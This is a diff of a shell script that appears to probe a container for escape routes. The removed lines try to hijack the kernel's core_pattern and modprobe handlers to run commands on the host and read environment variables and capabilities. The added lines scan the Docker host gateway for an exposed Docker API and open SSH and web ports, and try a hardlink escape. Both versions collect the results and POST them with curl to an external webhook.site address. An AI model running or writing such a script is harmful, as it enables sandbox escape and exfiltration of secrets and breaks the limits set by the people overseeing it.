@@ -4,16 +4,16 @@ read -r REQ
 {
 echo "=== ID ==="; id
 echo "=== HOSTNAME ==="; hostname
-echo "=== UNAME ==="; uname -a
-echo "=== COREPATTERN_BEFORE ==="; cat /proc/sys/kernel/core_pattern 2>&1
-echo "=== WRITE_TEST ==="
-printf '|/bin/sh -c "echo PWNED > /tmp/pwned"\n' > /proc/sys/kernel/core_pattern 2>/tmp/writeerr && echo WRITE_OK || { echo WRITE_FAIL; cat /tmp/writeerr; }
-echo "=== COREPATTERN_AFTER ==="; cat /proc/sys/kernel/core_pattern 2>&1
-echo "=== MODPROBE_TEST ==="
-printf '/bin/sh -c "echo MODPROBE_PWNED > /tmp/modprobe_pwned"\n' > /proc/sys/kernel/modprobe 2>/tmp/moderr && echo MODPROBE_WRITE_OK || { echo MODPROBE_WRITE_FAIL; cat /tmp/moderr; }
-echo "=== MOUNTINFO ==="; cat /proc/self/mountinfo 2>&1 | head -30
-echo "=== ENV ==="; cat /proc/self/environ 2>&1 | tr '\0' '\n' | head -30
-echo "=== CAPS ==="; grep Cap /proc/self/status 2>&1
+echo "=== HOSTS ==="; cat /etc/hosts 2>&1
+echo "=== RESOLV ==="; cat /etc/resolv.conf 2>&1
+echo "=== ROUTE ==="; cat /proc/net/route 2>&1
+echo "=== DOCKER2375 ==="; wget -qO- -T 5 http://172.17.0.1:2375/version 2>&1 | head -5
+echo "=== DOCKER2376 ==="; wget -qO- -T 5 http://172.17.0.1:2376/version 2>&1 | head -5
+echo "=== HOST3000 ==="; wget -qO- -T 5 http://172.17.0.1:3000/ 2>&1 | head -5
+echo "=== HOST8080 ==="; wget -qO- -T 5 http://172.17.0.1:8080/ 2>&1 | head -5
+echo "=== HOST80 ==="; wget -qO- -T 5 http://172.17.0.1/ 2>&1 | head -5
+echo "=== HOST22 ==="; (echo > /dev/tcp/172.17.0.1/22) 2>&1 && echo SSH_OPEN || echo SSH_CLOSED
+echo "=== HOSTS_FILE_HARDLINK_TEST ==="; ln /etc/hosts /code/src/hosts_link.rs 2>&1 && echo HARDLINK_OK || echo HARDLINK_FAIL
 } > /tmp/evil_out.txt 2>&1
 if command -v curl >/dev/null 2>&1; then
   curl -s -m 20 -X POST --data-binary @/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b >/dev/null 2>&1
